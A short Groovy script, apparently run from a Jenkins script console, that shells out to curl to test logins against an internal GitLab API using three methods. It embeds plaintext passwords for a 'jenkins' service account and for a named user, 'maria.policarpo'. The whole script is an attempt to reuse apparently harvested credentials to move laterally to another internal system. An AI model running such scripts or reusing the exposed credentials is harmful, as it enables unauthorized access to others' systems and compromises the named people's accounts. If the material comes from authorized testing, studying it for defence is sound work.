// MICRO-A: Test GitLab API auth - multiple methods
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    p.waitForOrKill(12000)
    [out: p.inputStream.text.take(1500), err: p.errorStream.text.take(300)]
}

// Method 1: Session API (older GitLab supports this)
def r1 = run('curl -s -X POST "http://172.27.140.134/api/v4/session" -H "Content-Type: application/json" -d \'{"login":"jenkins","password":"e6LBqIkOI$PR1XX2oia"}\' --max-time 8')
println "=== SESSION API ==="
println r1.out

// Method 2: List projects with basic auth
def r2 = run('curl -s -u "jenkins:e6LBqIkOI\$PR1XX2oia" "http://172.27.140.134/api/v4/projects?per_page=5&simple=true" --max-time 8')
println "\n=== BASIC AUTH /api/v4/projects ==="
println r2.out

// Method 3: Try maria.policarpo
def r3 = run('curl -s -X POST "http://172.27.140.134/api/v4/session" -H "Content-Type: application/json" -d \'{"login":"maria.policarpo","password":"FtMRl4fDXzIDY4Yj"}\' --max-time 8')
println "\n=== SESSION (maria.policarpo) ==="
println r3.out

println "\n=== DONE MICRO-A ==="
